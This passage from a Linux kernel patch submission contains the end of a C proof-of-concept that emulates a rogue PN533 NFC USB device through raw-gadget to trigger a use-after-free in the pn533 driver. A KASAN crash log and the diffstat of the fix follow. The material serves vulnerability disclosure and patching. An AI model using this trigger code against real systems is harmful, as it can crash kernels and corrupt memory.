		if (cmd == -2)
			continue;
		if (cmd < 0)
			continue;
		fprintf(stderr, "cmd 0x%02x\n", cmd);

		if (send_ack(st->fd, st->ep_in) < 0) {
			perror("send_ack");
			break;
		}
		msleep_retry(1);

		switch (cmd) {
		case PN533_CMD_GET_FIRMWARE_VERSION: {
			static const uint8_t payload[] = {0x33, 0x01, 0x02, 0x07};

			if (send_resp_frame(st->fd, st->ep_in, cmd, payload,
					    sizeof(payload)) < 0) {
				perror("send_resp_frame 0x02");
				goto out;
			}
			fprintf(stderr, "resp 0x02 sent\n");
			break;
		}
		case PN533_CMD_SAM_CONFIGURATION:
			if (send_resp_frame(st->fd, st->ep_in, cmd, NULL, 0) < 0) {
				perror("send_resp_frame 0x14");
				goto out;
			}
			fprintf(stderr, "resp 0x14 sent\n");
			break;
		case PN533_CMD_RF_CONFIGURATION:
			if (send_resp_frame(st->fd, st->ep_in, cmd, NULL, 0) < 0) {
				perror("send_resp_frame 0x32");
				goto out;
			}
			fprintf(stderr, "resp 0x32 sent\n");
			maybe_disconnect_after_rf(st);
			break;
		case PN533_CMD_IN_LIST_PASSIVE_TARGET: {
			static const uint8_t payload[] = {0x00, 0x00};

			mark_first_poll(st, cmd);
			fprintf(stderr, "first poll path: IN_LIST_PASSIVE_TARGET\n");
			if (send_resp_frame(st->fd, st->ep_in, cmd, payload,
					    sizeof(payload)) < 0) {
				perror("send_resp_frame 0x4a");
				goto out;
			}
			fprintf(stderr, "resp 0x4a sent\n");
			arm_disconnect(st);
			break;
		}
		case PN533_CMD_TG_INIT_AS_TARGET:
			mark_first_poll(st, cmd);
			fprintf(stderr, "first poll path: TG_INIT_AS_TARGET\n");
			/*
			 * This path uses the dangling pointer before device
			 * removal, so it is a non-trigger attempt. Drop the
			 * gadget and let the wrapper retry.
			 */
			close(st->fd);
			st->saw_disconnect = true;
			st->stop = true;
			pthread_mutex_lock(&st->lock);
			pthread_cond_broadcast(&st->cond);
			pthread_mutex_unlock(&st->lock);
			pthread_kill(st->main_thread, SIGUSR1);
			goto out;
		default:
			if (send_resp_frame(st->fd, st->ep_in, cmd, NULL, 0) < 0) {
				perror("send_resp_frame");
				goto out;
			}
			break;
		}
	}

out:
	st->stop = true;
	return NULL;
}

static int handle_setup(struct gadget_state *st, const struct usb_ctrlrequest *ctrl,
			struct usb_descs *descs)
{
	uint8_t buf[256];
	uint16_t value = le16toh(ctrl->wValue);
	uint16_t index = le16toh(ctrl->wIndex);
	uint16_t length = le16toh(ctrl->wLength);

	(void)index;

	switch ((ctrl->bRequestType << 8) | ctrl->bRequest) {
	case (USB_DIR_IN | USB_TYPE_STANDARD | USB_RECIP_DEVICE) << 8 | USB_REQ_GET_DESCRIPTOR:
		switch (value >> 8) {
		case USB_DT_DEVICE:
			return raw_ep0_write(st->fd, &descs->dev,
					     length < sizeof(descs->dev) ? length :
					     sizeof(descs->dev));
		case USB_DT_CONFIG:
			return raw_ep0_write(st->fd, &descs->cfg1,
					     length < sizeof(descs->cfg1) ? length :
					     sizeof(descs->cfg1));
		case USB_DT_DEVICE_QUALIFIER:
			return raw_ep0_write(st->fd, &descs->qual,
					     length < sizeof(descs->qual) ? length :
					     sizeof(descs->qual));
		case USB_DT_OTHER_SPEED_CONFIG: {
			struct {
				typeof(descs->cfg1) cfg1;
			} other;

			memset(&other, 0, sizeof(other));
			memcpy(&other.cfg1, &descs->cfg1, sizeof(other.cfg1));
			other.cfg1.cfg.bDescriptorType = USB_DT_OTHER_SPEED_CONFIG;
			return raw_ep0_write(st->fd, &other,
					     length < sizeof(other) ? length :
					     sizeof(other));
		}
		case USB_DT_STRING:
			if ((value & 0xff) == 0) {
				static const uint8_t lang[] = {0x04, USB_DT_STRING, 0x09, 0x04};

				return raw_ep0_write(st->fd, lang,
						     length < sizeof(lang) ? length :
						     sizeof(lang));
			}
			memset(buf, 0, sizeof(buf));
			if ((value & 0xff) == 1)
				length = make_string_desc(buf, sizeof(buf), "NXP");
			else if ((value & 0xff) == 2)
				length = make_string_desc(buf, sizeof(buf), "PN533 Raw Gadget");
			else if ((value & 0xff) == 3)
				length = make_string_desc(buf, sizeof(buf), "0001");
			else
				return ioctl(st->fd, USB_RAW_IOCTL_EP0_STALL, 0);
			return raw_ep0_write(st->fd, buf, length);
		default:
			return ioctl(st->fd, USB_RAW_IOCTL_EP0_STALL, 0);
		}
	case (USB_DIR_OUT | USB_TYPE_STANDARD | USB_RECIP_DEVICE) << 8 | USB_REQ_SET_CONFIGURATION:
		if (value == 1 && !st->configured) {
			st->ep_out = ioctl(st->fd, USB_RAW_IOCTL_EP_ENABLE, &descs->cfg1.ep_out);
			if (st->ep_out < 0)
				return -1;
			st->ep_in = ioctl(st->fd, USB_RAW_IOCTL_EP_ENABLE, &descs->cfg1.ep_in);
			if (st->ep_in < 0)
				return -1;
			if (raw_ep0_read(st->fd, NULL, 0) < 0)
				return -1;
			if (ioctl(st->fd, USB_RAW_IOCTL_CONFIGURE, 0) < 0)
				return -1;
			st->configured = true;
			if (pthread_create(&st->bulk_thread, NULL, bulk_thread_main, st))
				return -1;
			return 0;
		}
		return raw_ep0_read(st->fd, NULL, 0);
	case (USB_DIR_IN | USB_TYPE_STANDARD | USB_RECIP_DEVICE) << 8 | USB_REQ_GET_CONFIGURATION:
		buf[0] = st->configured ? 1 : 0;
		return raw_ep0_write(st->fd, buf, 1);
	case (USB_DIR_OUT | USB_TYPE_STANDARD | USB_RECIP_DEVICE) << 8 | USB_REQ_SET_ADDRESS:
	case (USB_DIR_OUT | USB_TYPE_STANDARD | USB_RECIP_DEVICE) << 8 | USB_REQ_SET_FEATURE:
	case (USB_DIR_OUT | USB_TYPE_STANDARD | USB_RECIP_DEVICE) << 8 | USB_REQ_CLEAR_FEATURE:
		return raw_ep0_read(st->fd, NULL, 0);
	case (USB_DIR_IN | USB_TYPE_STANDARD | USB_RECIP_DEVICE) << 8 | USB_REQ_GET_STATUS:
	case (USB_DIR_IN | USB_TYPE_STANDARD | USB_RECIP_INTERFACE) << 8 | USB_REQ_GET_STATUS:
	case (USB_DIR_IN | USB_TYPE_STANDARD | USB_RECIP_ENDPOINT) << 8 | USB_REQ_GET_STATUS:
		buf[0] = 0;
		buf[1] = 0;
		return raw_ep0_write(st->fd, buf, 2);
	case (USB_DIR_OUT | USB_TYPE_STANDARD | USB_RECIP_INTERFACE) << 8 | USB_REQ_SET_INTERFACE:
		return raw_ep0_read(st->fd, NULL, 0);
	case (USB_DIR_IN | USB_TYPE_STANDARD | USB_RECIP_INTERFACE) << 8 | USB_REQ_GET_INTERFACE:
		buf[0] = 0;
		return raw_ep0_write(st->fd, buf, 1);
	default:
		return ioctl(st->fd, USB_RAW_IOCTL_EP0_STALL, 0);
	}
}

int main(void)
{
	struct gadget_state st;
	struct usb_raw_init init;
	struct usb_descs descs;
	struct usb_raw_event *event;
	struct sigaction sa;
	int rc = 1;

	memset(&st, 0, sizeof(st));
	memset(&sa, 0, sizeof(sa));
	sa.sa_handler = sigusr1_handler;
	sigaction(SIGUSR1, &sa, NULL);
	pthread_mutex_init(&st.lock, NULL);
	pthread_cond_init(&st.cond, NULL);
	st.main_thread = pthread_self();
	st.rf_disconnect_delay_ms = getenv_int("RF_DISCONNECT_DELAY_MS", 0);

	st.base_nfc_count = count_nfc_devices();
	if (st.base_nfc_count < 0) {
		perror("count_nfc_devices");
		return 1;
	}

	st.fd = open("/dev/raw-gadget", O_RDWR);
	if (st.fd < 0) {
		perror("open /dev/raw-gadget");
		return 1;
	}

	memset(&init, 0, sizeof(init));
	snprintf((char *)init.driver_name, sizeof(init.driver_name), "dummy_udc");
	if (choose_udc_name((char *)init.device_name, sizeof(init.device_name)) < 0) {
		perror("choose_udc_name");
		goto out_close;
	}
	fprintf(stderr, "using UDC %s\n", init.device_name);
	init.speed = USB_SPEED_HIGH;
	if (ioctl(st.fd, USB_RAW_IOCTL_INIT, &init) < 0) {
		perror("USB_RAW_IOCTL_INIT");
		goto out_close;
	}
	if (ioctl(st.fd, USB_RAW_IOCTL_RUN, 0) < 0) {
		perror("USB_RAW_IOCTL_RUN");
		goto out_close;
	}

	fill_descs(&descs);

	if (pthread_create(&st.ctrl_thread, NULL, ctrl_thread_main, &st)) {
		perror("pthread_create ctrl");
		goto out_close;
	}

	while (!st.stop) {
		struct usb_ctrlrequest ctrl;

		if (raw_event_fetch(st.fd, &event) < 0) {
			if (!st.stop)
				perror("USB_RAW_IOCTL_EVENT_FETCH");
			break;
		}

		switch (event->type) {
		case USB_RAW_EVENT_CONNECT:
			break;
		case USB_RAW_EVENT_CONTROL:
			if (event->length < sizeof(ctrl)) {
				free((void *)event);
				continue;
			}
			memcpy(&ctrl, event->data, sizeof(ctrl));
			if (handle_setup(&st, &ctrl, &descs) < 0 && !st.stop)
				perror("handle_setup");
			if (st.configured) {
				free((void *)event);
				goto after_events;
			}
			break;
		case USB_RAW_EVENT_RESET:
			break;
		case USB_RAW_EVENT_DISCONNECT:
			st.stop = true;
			break;
		default:
			break;
		}

		free((void *)event);
	}

after_events:
	if (st.configured)
		pthread_join(st.bulk_thread, NULL);
	if (st.saw_disconnect)
		msleep_retry(200);
	pthread_mutex_lock(&st.lock);
	pthread_cond_broadcast(&st.cond);
	pthread_mutex_unlock(&st.lock);
	if (st.ctrl_thread)
		pthread_join(st.ctrl_thread, NULL);

	if (st.ctrl_rc == 0 && st.saw_first_poll) {
		fprintf(stderr, "first poll command: 0x%02x\n", st.first_poll_cmd);
		rc = 2;
	}

out_close:
	close(st.fd);
	pthread_cond_destroy(&st.cond);
	pthread_mutex_destroy(&st.lock);
	return rc;
}
------END poc.c--------

----BEGIN crash log----
[   97.789807][   T57] =========================================================
[   97.790867][   T57] BUG: KASAN: slab-use-after-free in pn533_send_poll_frame0
[   97.791913][   T57] Read of size 17 at addr ffff8880331ab298 by task kworker7
[   97.792731][   T57] 
[   97.793113][   T57] CPU: 0 UID: 0 PID: 57 Comm: kworker/u8:4 Not tainted 7.0 
[   97.793122][   T57] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, a4
[   97.793128][   T57] Workqueue: pn533 pn533_wq_poll
[   97.793162][   T57] Call Trace:
[   97.793175][   T57]  <TASK>
[   97.793179][   T57]  dump_stack_lvl+0x10e/0x1f0
[   97.793284][   T57]  print_report+0xf7/0x600
[   97.793339][   T57]  ? preempt_count_sub+0x13/0xd0
[   97.793386][   T57]  ? __virt_addr_valid+0x1ab/0x330
[   97.793428][   T57]  ? __phys_addr+0x41/0x90
[   97.793438][   T57]  ? pn533_send_poll_frame+0x3e6/0x730
[   97.793448][   T57]  kasan_report+0xe4/0x120
[   97.793456][   T57]  ? pn533_send_poll_frame+0x3e6/0x730
[   97.793466][   T57]  kasan_check_range+0x105/0x1b0
[   97.793482][   T57]  __asan_memcpy+0x23/0x60
[   97.793492][   T57]  pn533_send_poll_frame+0x3e6/0x730
[   97.793502][   T57]  ? __pfx_pn533_send_poll_frame+0x10/0x10
[   97.793512][   T57]  ? do_raw_spin_unlock+0x82/0xf0
[   97.793534][   T57]  ? preempt_count_sub+0x13/0xd0
[   97.793541][   T57]  ? _raw_spin_unlock_irqrestore+0x3b/0x80
[   97.793559][   T57]  ? debug_object_deactivate+0x22b/0x240
[   97.793613][   T57]  ? rcu_is_watching+0x3d/0x80
[   97.793633][   T57]  ? lock_acquire+0x303/0x360
[   97.793639][   T57]  pn533_wq_poll+0xcf/0x220
[   97.793649][   T57]  process_one_work+0x62b/0xfb0
[   97.793670][   T57]  ? __pfx_call_usermodehelper_exec_work+0x10/0x10
[   97.793685][   T57]  ? __pfx_process_one_work+0x10/0x10
[   97.793694][   T57]  ? __list_add_valid_or_report+0x37/0xf0
[   97.793705][   T57]  ? __pfx_pn533_wq_poll+0x10/0x10
[   97.793714][   T57]  worker_thread+0x3fd/0x7e0
[   97.793724][   T57]  ? __pfx_worker_thread+0x10/0x10
[   97.793733][   T57]  kthread+0x221/0x280
[   97.793748][   T57]  ? kthread+0xca/0x280
[   97.793756][   T57]  ? __pfx_kthread+0x10/0x10
[   97.793765][   T57]  ret_from_fork+0x899/0x9b0
[   97.793793][   T57]  ? __pfx_ret_from_fork+0x10/0x10
[   97.793800][   T57]  ? __switch_to+0x469/0x9d0
[   97.793822][   T57]  ? get_bits.cold+0x27/0x48
[   97.793847][   T57]  ? __pfx_kthread+0x10/0x10
[   97.793856][   T57]  ret_from_fork_asm+0x1a/0x30
[   97.793877][   T57]  </TASK>
[   97.793879][   T57] 
[   97.813377][   T57] Allocated by task 10:
[   97.813829][   T57]  kasan_save_stack+0x33/0x60
[   97.814231][   T57]  kasan_save_track+0x14/0x30
[   97.814619][   T57]  __kasan_kmalloc+0xaa/0xb0
[   97.815000][   T57]  nfc_llcp_register_device+0x34/0x560
[   97.815571][   T57]  nfc_register_device+0x6d/0x2c0
[   97.815990][   T57]  pn53x_register_nfc+0xa2/0x100
[   97.816401][   T57]  pn533_usb_probe+0x6a8/0x760
[   97.816810][   T57]  usb_probe_interface+0x206/0x5f0
[   97.817399][   T57]  really_probe+0x1a0/0x6f0
[   97.817806][   T57]  __driver_probe_device+0x15d/0x300
[   97.818253][   T57]  driver_probe_device+0x4a/0x140
[   97.818680][   T57]  __device_attach_driver+0x14a/0x240
[   97.819122][   T57]  bus_for_each_drv+0x130/0x1a0
[   97.819687][   T57]  __device_attach+0x17c/0x3b0
[   97.820107][   T57]  device_initial_probe+0x7f/0x90
[   97.820522][   T57]  bus_probe_device+0x51/0xe0
[   97.821150][   T57]  device_add+0xd37/0x1060
[   97.822005][   T57]  usb_set_configuration+0xce5/0x1240
[   97.822474][   T57]  usb_generic_driver_probe+0x8f/0xe0
[   97.822943][   T57]  usb_probe_device+0xac/0x2a0
[   97.823479][   T57]  really_probe+0x1a0/0x6f0
[   97.823901][   T57]  __driver_probe_device+0x15d/0x300
[   97.824376][   T57]  driver_probe_device+0x4a/0x140
[   97.824979][   T57]  __device_attach_driver+0x14a/0x240
[   97.826662][   T57]  bus_for_each_drv+0x130/0x1a0
[   97.827173][   T57]  __device_attach+0x17c/0x3b0
[   97.827627][   T57]  device_initial_probe+0x7f/0x90
[   97.828109][   T57]  bus_probe_device+0x51/0xe0
[   97.828572][   T57]  device_add+0xd37/0x1060
[   97.828997][   T57]  usb_new_device+0x826/0xe20
[   97.829541][   T57]  hub_event+0x25cd/0x37f0
[   97.829985][   T57]  process_one_work+0x62b/0xfb0
[   97.830451][   T57]  worker_thread+0x3fd/0x7e0
[   97.830901][   T57]  kthread+0x221/0x280
[   97.831302][   T57]  ret_from_fork+0x899/0x9b0
[   97.831742][   T57]  ret_from_fork_asm+0x1a/0x30
[   97.832200][   T57] 
[   97.832427][   T57] Freed by task 10:
[   97.832795][   T57]  kasan_save_stack+0x33/0x60
[   97.833307][   T57]  kasan_save_track+0x14/0x30
[   97.833830][   T57]  kasan_save_free_info+0x3b/0x60
[   97.834326][   T57]  __kasan_slab_free+0x5f/0x80
[   97.834823][   T57]  kfree+0x2e2/0x6c0
[   97.835236][   T57]  nfc_llcp_local_put.part.0+0x8c/0xb0
[   97.835748][   T57]  nfc_llcp_unregister_device+0x131/0x1c0
[   97.836351][   T57]  nfc_remove_device+0x5b/0x90
[   97.836863][   T57]  pn53x_unregister_nfc+0x1d/0x40
[   97.837410][   T57]  pn533_usb_disconnect+0x53/0x140
[   97.838191][   T57]  usb_unbind_interface+0x132/0x5a0
[   97.838713][   T57]  device_remove+0xaf/0xc0
[   97.839198][   T57]  device_release_driver_internal+0x313/0x3c0
[   97.839866][   T57]  bus_remove_device+0x20a/0x360
[   97.840383][   T57]  device_del+0x282/0x640
[   97.840856][   T57]  usb_disable_device+0x228/0x500
[   97.841363][   T57]  usb_disconnect+0x1e3/0x5e0
[   97.841841][   T57]  hub_event+0x17cd/0x37f0
[   97.842336][   T57]  process_one_work+0x62b/0xfb0
[   97.842848][   T57]  worker_thread+0x3fd/0x7e0
[   97.843320][   T57]  kthread+0x221/0x280
[   97.843696][   T57]  ret_from_fork+0x899/0x9b0
[   97.844140][   T57]  ret_from_fork_asm+0x1a/0x30
[   97.844610][   T57] 
[   97.844868][   T57] The buggy address belongs to the object at ffff8880331ab0
[   97.844868][   T57]  which belongs to the cache kmalloc-2k of size 2048
[   97.846272][   T57] The buggy address is located 664 bytes inside of
[   97.846272][   T57]  freed 2048-byte region [ffff8880331ab000, ffff8880331ab)
[   97.847510][   T57] 
[   97.847750][   T57] The buggy address belongs to the physical page:
[   97.848413][   T57] page: refcount:0 mapcount:0 mapping:0000000000000000 ind8
[   97.849343][   T57] head: order:3 mapcount:0 entire_mapcount:0 nr_pages_mapp0
[   97.850171][   T57] flags: 0xfff00000000240(workingset|head|node=0|zone=1|la)
[   97.851033][   T57] page_type: f5(slab)
[   97.851413][   T57] raw: 00fff00000000240 ffff888017842000 ffffea0000cd7410 0
[   97.852501][   T57] raw: ffff8880331ac000 0000000800080007 00000000f5000000 0
[   97.853568][   T57] head: 00fff00000000240 ffff888017842000 ffffea0000cd74100
[   97.854481][   T57] head: ffff8880331ac000 0000000800080007 00000000f50000000
[   97.855343][   T57] head: 00fff00000000003 fffffffffffffe01 00000000fffffffff
[   97.856242][   T57] head: ffffffffffffffff 0000000000000000 00000000ffffffff8
[   97.857060][   T57] page dumped because: kasan: bad access detected
[   97.857682][   T57] page_owner tracks the page as allocated
[   97.858252][   T57] page last allocated via order 3, migratetype Unmovable, 3
[   97.860377][   T57]  post_alloc_hook+0xe6/0x100
[   97.860920][   T57]  get_page_from_freelist+0x55c/0x2210
[   97.861413][   T57]  __alloc_frozen_pages_noprof+0x221/0x1cb0
[   97.861977][   T57]  new_slab+0xa2/0x5f0
[   97.862567][   T57]  refill_objects+0xe3/0x430
[   97.863007][   T57]  __pcs_replace_empty_main+0x2ed/0x650
[   97.863539][   T57]  __kvmalloc_node_noprof+0x7a6/0x9a0
[   97.864107][   T57]  proc_sys_call_handler+0x253/0x480
[   97.864630][   T57]  vfs_read+0x5d9/0x740
[   97.865070][   T57]  ksys_read+0x103/0x1f0
[   97.865484][   T57]  do_syscall_64+0x116/0x800
[   97.865958][   T57]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[   97.866594][   T57] page last free pid 1 tgid 1 stack trace:
[   97.867362][   T57]  __free_frozen_pages+0x52d/0x960
[   97.867887][   T57]  qlist_free_all+0x47/0xf0
[   97.868282][   T57]  kasan_quarantine_reduce+0x195/0x1e0
[   97.868796][   T57]  __kasan_slab_alloc+0x69/0x90
[   97.869318][   T57]  __kvmalloc_node_noprof+0x34a/0x9a0
[   97.869836][   T57]  proc_sys_call_handler+0x253/0x480
[   97.870356][   T57]  vfs_read+0x5d9/0x740
[   97.870856][   T57]  ksys_read+0x103/0x1f0
[   97.871270][   T57]  do_syscall_64+0x116/0x800
[   97.871733][   T57]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[   97.872270][   T57] 
[   97.872519][   T57] Memory state around the buggy address:
[   97.873039][   T57]  ffff8880331ab180: fb fb fb fb fb fb fb fb fb fb fb fb fb
[   97.873788][   T57]  ffff8880331ab200: fb fb fb fb fb fb fb fb fb fb fb fb fb
[   97.874578][   T57] >ffff8880331ab280: fb fb fb fb fb fb fb fb fb fb fb fb fb
[   97.875356][   T57]                             ^
[   97.875820][   T57]  ffff8880331ab300: fb fb fb fb fb fb fb fb fb fb fb fb fb
[   97.876634][   T57]  ffff8880331ab380: fb fb fb fb fb fb fb fb fb fb fb fb fb
[   97.877383][   T57] =========================================================
[   97.878226][   T57] Kernel panic - not syncing: KASAN: panic_on_warn set ...
[   97.878895][   T57] CPU: 0 UID: 0 PID: 57 Comm: kworker/u8:4 Not tainted 7.0 
[   97.880202][   T57] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, a4
[   97.881501][   T57] Workqueue: pn533 pn533_wq_poll
[   97.882193][   T57] Call Trace:
[   97.882567][   T57]  <TASK>
[   97.883090][   T57]  dump_stack_lvl+0x3b/0x1f0
[   97.883718][   T57]  vpanic+0x8b4/0x930
[   97.884191][   T57]  ? __pfx_vpanic+0x10/0x10
[   97.884681][   T57]  ? rcu_is_watching+0x3d/0x80
[   97.885213][   T57]  ? pn533_send_poll_frame+0x3e6/0x730
[   97.885760][   T57]  panic+0xca/0xd0
[   97.886145][   T57]  ? __pfx_panic+0x10/0x10
[   97.886575][   T57]  ? pn533_send_poll_frame+0x3e6/0x730
[   97.887096][   T57]  ? preempt_schedule_thunk+0x16/0x40
[   97.887873][   T57]  ? preempt_schedule_common+0x3b/0x80
[   97.888425][   T57]  ? preempt_schedule_thunk+0x16/0x40
[   97.888932][   T57]  ? check_panic_on_warn+0x1f/0xb0
[   97.889390][   T57]  check_panic_on_warn+0xab/0xb0
[   97.889888][   T57]  end_report+0x132/0x180
[   97.890303][   T57]  kasan_report+0xf4/0x120
[   97.890713][   T57]  ? pn533_send_poll_frame+0x3e6/0x730
[   97.891203][   T57]  kasan_check_range+0x105/0x1b0
[   97.891754][   T57]  __asan_memcpy+0x23/0x60
[   97.892217][   T57]  pn533_send_poll_frame+0x3e6/0x730
[   97.892720][   T57]  ? __pfx_pn533_send_poll_frame+0x10/0x10
[   97.893279][   T57]  ? do_raw_spin_unlock+0x82/0xf0
[   97.893758][   T57]  ? preempt_count_sub+0x13/0xd0
[   97.894213][   T57]  ? _raw_spin_unlock_irqrestore+0x3b/0x80
[   97.894926][   T57]  ? debug_object_deactivate+0x22b/0x240
[   97.895553][   T57]  ? rcu_is_watching+0x3d/0x80
[   97.896415][   T57]  ? lock_acquire+0x303/0x360
[   97.897025][   T57]  pn533_wq_poll+0xcf/0x220
[   97.897474][   T57]  process_one_work+0x62b/0xfb0
[   97.897949][   T57]  ? __pfx_call_usermodehelper_exec_work+0x10/0x10
[   97.898595][   T57]  ? __pfx_process_one_work+0x10/0x10
[   97.899158][   T57]  ? __list_add_valid_or_report+0x37/0xf0
[   97.899760][   T57]  ? __pfx_pn533_wq_poll+0x10/0x10
[   97.900325][   T57]  worker_thread+0x3fd/0x7e0
[   97.900834][   T57]  ? __pfx_worker_thread+0x10/0x10
[   97.901438][   T57]  kthread+0x221/0x280
[   97.901837][   T57]  ? kthread+0xca/0x280
[   97.902255][   T57]  ? __pfx_kthread+0x10/0x10
[   97.902688][   T57]  ret_from_fork+0x899/0x9b0
[   97.903175][   T57]  ? __pfx_ret_from_fork+0x10/0x10
[   97.903681][   T57]  ? __switch_to+0x469/0x9d0
[   97.904226][   T57]  ? get_bits.cold+0x27/0x48
[   97.904699][   T57]  ? __pfx_kthread+0x10/0x10
[   97.905178][   T57]  ret_from_fork_asm+0x1a/0x30
[   97.905669][   T57]  </TASK>
[   97.906654][   T57] Kernel Offset: disabled
[   97.907067][   T57] Rebooting in 86400 seconds..
-----END crash log-----

Best regards,
Luxiao Xu


Luxiao Xu (1):
  nfc: llcp: Pass caller buffer to nfc_llcp_general_bytes to fix UAF and
    memory leaks

 drivers/nfc/microread/microread.c |  5 ++---
 drivers/nfc/pn533/pn533.c         | 10 +++++-----
 drivers/nfc/pn533/pn533.h         |  2 +-
 drivers/nfc/pn544/pn544.c         |  7 +++----
 drivers/nfc/st21nfca/core.c       |  5 ++---
 include/net/nfc/hci.h             |  2 +-
 include/net/nfc/nfc.h             |  2 +-
 net/nfc/core.c                    | 10 +++++-----
 net/nfc/digital_dep.c             |  3 ++-
 net/nfc/llcp_core.c               | 18 ++++++++++++------
 net/nfc/nci/core.c                |  3 ++-
 net/nfc/nfc.h                     |  2 +-
 12 files changed, 37 insertions(+), 32 deletions(-)

-- 
2.43.0

